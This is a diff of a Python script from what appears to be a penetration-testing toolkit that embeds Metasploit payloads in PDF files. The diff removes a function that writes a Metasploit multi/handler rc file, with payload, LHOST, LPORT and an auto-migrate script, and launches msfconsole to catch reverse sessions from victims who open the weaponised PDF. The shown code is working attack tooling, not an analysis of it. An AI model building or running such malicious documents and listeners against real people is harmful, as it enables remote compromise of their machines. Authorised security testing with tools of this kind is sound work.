@@ -1,9 +1,6 @@
 #!/usr/bin/python
 #
 # msfpayload to pdf
-#
-## Comments ##
-# msfcli set up to start /fileformat/adobe_pdf_embedded_exe exploit than inject a readable pdf with payload.
 
 import os
 import sys
@@ -14,29 +11,6 @@ import subprocess
 from src.core import menus
 from src.core.main import *
 from time import sleep
-
-def start_listener():
-	PrintInfo("Starting multi handler")
-
-	# create rc file
-	rcfile = "output/pdf_listener.rc"
-	fw = open(rcfile, "w")
-	fw.write("use exploit/multi/handler\n")
-	fw.write("set PAYLOAD %s\n" % payload2)
-	fw.write("set LHOST %s\n" % ip) # changed this to use a tuple instead of 0.0.0.0
-	fw.write("set LPORT %s\n" % port)
-	if not selection or selection in ('1','2'):
-		fw.write("set ExitOnSession false\n")
-		fw.write("set AutoRunScript migrate -f\n")
-	fw.write("exploit -j -z")
-	fw.close()
-
-	# start listener
-	subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()
-
-	PrintInfo("Cleaning up...")
-	os.remove(rcfile)
-	time.sleep(1)
 
 while 1:
 	try:
@@ -110,11 +84,6 @@ while 1:
 		PrintInfo("payload.pdf is currently being moved to the output directory.")
 		sleep(1)
 		
-		# start multi/handler listener
-		listener = raw_input("\nStart MSF listener (Y/N):")
-		if listener == 'Y' or listener == 'y' or listener == '':
-			start_listener()
-
 		# return to main
 		# clean up
 		os.remove(infile)
